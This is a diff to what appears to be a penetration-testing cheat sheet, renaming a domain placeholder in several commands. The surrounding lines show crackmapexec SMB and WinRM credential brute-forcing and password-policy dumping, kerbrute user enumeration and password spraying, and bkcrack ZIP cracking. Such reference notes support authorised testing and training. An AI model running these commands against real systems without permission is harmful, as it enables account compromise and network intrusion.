@@ -99,7 +99,7 @@ $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p 
 $ crackmapexec smb <RHOST> -u '' -p '' --shares
 $ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 $ crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --shares
-$ crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <TARGET_DOMAIN> <RHOST>
+$ crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>
 $ crackmapexec winrm <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
 $ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
 $ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
@@ -348,13 +348,13 @@ $ sudo john --show <FILE>
 ### User Enumeration
 
 ```c
-$ ./kerbrute userenum -d <TARGET_DOMAIN> --dc <TARGET_DOMAIN> /PATH/TO/FILE/<USERNAMES>
+$ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
 ```
 
 ### Password Spray
 
 ```c
-$ ./kerbrute passwordspray -d <TARGET_DOMAIN> --dc <TARGET_DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
+$ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
 ```
 
 ## LaZagne
